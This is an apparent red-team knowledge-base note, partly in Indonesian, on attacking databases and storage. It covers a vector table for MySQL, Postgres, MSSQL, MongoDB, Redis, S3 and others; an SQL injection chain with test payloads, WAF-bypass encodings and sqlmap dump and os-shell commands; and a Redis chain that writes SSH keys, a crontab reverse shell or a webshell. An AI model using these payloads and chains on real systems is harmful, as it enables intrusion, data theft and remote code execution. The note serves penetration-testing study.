---
title: Attack Perspective — Database & Storage Systems (Red Team)
tags:
- attack
- red-team
- database
- sql
- nosql
- redis
- exfiltration
- injection
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  - callout
---

# Database & Storage — Perspektif Penyerang

> Database = target utama exfiltration. Red team serang: SQL injection, NoSQL injection, Redis/Memcached default config, credential theft, backup hijack.

## 1. Attack Surface Database

| Database | Vektor | MITRE ID | Tool / Teknik | Evasion | Detection Gap |
|----------|--------|----------|---------------|---------|----------------|
| **MySQL/MariaDB** | SQLi → dump, UDF RCE, `LOAD_FILE`/`INTO OUTFILE` | T1190 | sqlmap, manual injection | WAF bypass via encoding/whitespace | Query audit jarang real-time |
| **PostgreSQL** | SQLi → `COPY TO`, `pg_read_file`, RCE via `lo_export` | T1190 | sqlmap, pg\_dump | `COPY... TO PROGRAM` → RCE | Postgres audit log jarang |
| **MSSQL** | `xp_cmdshell` RCE, `OPENROWSET`, linked server pivot | T1190 | sqlmap –os-shell | Enable `xp_cmdshell` via sp_configure | MSSQL audit jarang default |
| **Oracle** | PL/SQL injection, `DBMS_JAVA` RCE, privilege escalation | T1190 | SQL Ninja, manual | PL/SQL wrapper → stealth | Oracle audit = expensive license |
| **MongoDB** | NoSQL injection (`$where`, `$gt`), unauthenticated default | T1190 | NoSQLMap, mongo scan | Default = no auth, no TLS | MongoDB audit log jarang |
| **Redis** | Default no auth → `CONFIG SET dir` → SSH key + crontab RCE | T1190 | redis-cli, redis-rogue-server | No auth = legit connection | Redis logging = minimal |
| **Memcached** | Default no auth → UDP amplification, data exfil | T1190 | memcflux, memcached-tool | UDP = spoofed source | No auth log |
| **Elasticsearch** | Default open → `_search` dump, script injection | T1190 | curl, elasticdump | Default = no auth | ES audit jarang |
| **Cassandra** | Default `cassandra/cassandra` → CQL injection | T1190 | cqlsh, manual | Default creds = legit login | Audit jarang |
| **S3/Cloud Storage** | Public bucket, ACL abuse, IAM misconfig | T1530 | s3scanner, aws s3 sync | Anonymous = no trace | S3 audit log jarang |

## 2. SQL Injection Chain

```
Recon: Identifikasi parameter input (URL, POST, header, JSON)
 ↓
Detection: Error-based / Boolean-based / Time-based / UNION
 ├── `id=1'` → SQL error → SQLi confirmed
 ├── `id=1 AND 1=1` vs `id=1 AND 1=2` → response differ → Boolean
 ├── `id=1; WAITFOR DELAY '0:5'` → time differ → Time-based
 └── `id=1 UNION SELECT 1,2,3` → column count → UNION
 ↓
WAF Bypass:
 ├── Encoding: URL, double URL, hex, unicode
 ├── Whitespace: tab, newline, comment (/**/ /*!*/)
 ├── Case: UnIoN SeLeCt
 ├── Keyword: /*!50000 UNION*/ (MySQL versioned comment)
 └── Alternative: HAVING, GROUP BY, ORDER BY → extract
 ↓
Exploitation:
 ├── `sqlmap -u "url" --dbs` → enumerate database
 ├── `sqlmap --dump-all` → full dump (noisy)
 ├── `sqlmap --os-shell` → RCE (via `INTO OUTFILE` / `xp_cmdshell`)
 └── Manual: `UNION SELECT` → `information_schema.tables` → `columns` → `data`
 ↓
Post-Exploit:
 ├── RCE via UDF (MySQL) / `xp_cmdshell` (MSSQL) / `COPY TO PROGRAM` (Postgres)
 ├── File read: `LOAD_FILE()` / `pg_read_file()`
 └── File write: `INTO OUTFILE` → webshell
```

## 3. Redis Attack Chain (Unauthenticated RCE)

```
Recon: Shodan port 6379 → exposed Redis
 ↓
Connect: redis-cli -h target → no auth required
 ↓
RCE Method 1 — SSH key: CONFIG SET dir /root/.ssh/ → write authorized_keys
 ↓
RCE Method 2 — Crontab: CONFIG SET dir /var/spool/cron/ → write crontab → reverse shell
 ↓
RCE Method 3 — Webshell: CONFIG SET dir /var/www/html/ → set dbfilename shell.php → write
 ↓
RCE Method 4 — Module: MODULE LOAD malicious.so → native function → RCE
 ↓
Persistence: Redis key → periodic re-trigger crontab
 ↓
Lateral: SSH key → pivot ke other host
```

## 4. Tool Stack

| Tool | Use |
|------|-----|
| **sqlmap** | Automated SQLi (dump, os-shell, tamper script) |
| **NoSQLMap** | NoSQL injection (MongoDB, CouchDB) |
| **redis-cli** | Redis exploitation |
| **redis-rogue-server** | Redis RCE via rogue master replication |
| **elasticdump** | Elasticsearch data dump |
| **aws s3** | S3 bucket enum + exfil |
| **impacket** | MSSQL relay (`mssqlrelay`) |

## 5. Referensi
- sqlmap — https://sqlmap.org/
- NoSQLMap — https://github.com/codingo/NoSQLMap
- redis-rogue-server — https://github.com/n0b0dyCN/redis-rogue-server
- PortSwigger SQLi Cheat Sheet — https://portswigger.net/web-security/sql-injection/cheat-sheet
- HackTricks (SQLi) — https://book.hacktricks.xyz/pentesting-web/sql-injection
---

audited
---
